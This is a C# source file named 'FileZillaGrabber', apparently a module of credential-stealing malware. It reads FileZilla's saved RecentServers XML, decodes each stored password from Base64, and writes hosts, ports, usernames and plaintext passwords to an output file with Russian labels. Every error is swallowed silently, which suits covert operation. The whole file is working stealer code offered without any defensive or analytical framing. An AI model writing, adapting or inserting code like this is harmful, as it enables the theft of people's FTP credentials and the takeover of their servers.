namespace FileZillaGrabber
{
    using System;
    using System.IO;
    using System.Text;
    using System.Xml;

    public class Go
    {
        private static StringBuilder SB = new StringBuilder();
        public static void GetDataFileZilla(string PathFZ, string SaveFile, string RS = "RecentServers", string Serv = "Server")
        {
            try
            {
                if (File.Exists(PathFZ))
                {
                    try
                    {
                        var xf = new XmlDocument();
                        xf.Load(PathFZ);
                        foreach (XmlElement XE in ((XmlElement)xf.GetElementsByTagName(RS)[0]).GetElementsByTagName(Serv))
                        {
                            var Host = XE.GetElementsByTagName("Host")[0].InnerText;
                            var Port = XE.GetElementsByTagName("Port")[0].InnerText;
                            var User = XE.GetElementsByTagName("User")[0].InnerText;
                            var Pass = (Encoding.UTF8.GetString(Convert.FromBase64String(XE.GetElementsByTagName("Pass")[0].InnerText)));
                            if (!string.IsNullOrEmpty(Host) && !string.IsNullOrEmpty(Port) && !string.IsNullOrEmpty(User) && !string.IsNullOrEmpty(Pass))
                            {
                                SB.AppendLine($"Хост: {Host}");
                                SB.AppendLine($"Порт: {Port}");
                                SB.AppendLine($"Пользователь: {User}");
                                SB.AppendLine($"Пароль: {Pass}\r\n");
                            }
                            else
                            {
                                break;
                            }
                        }
                        if (SB.Length > 0)
                        {
                            try
                            {
                                File.AppendAllText(SaveFile, SB.ToString());
                            }
                            catch { }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }
    }
}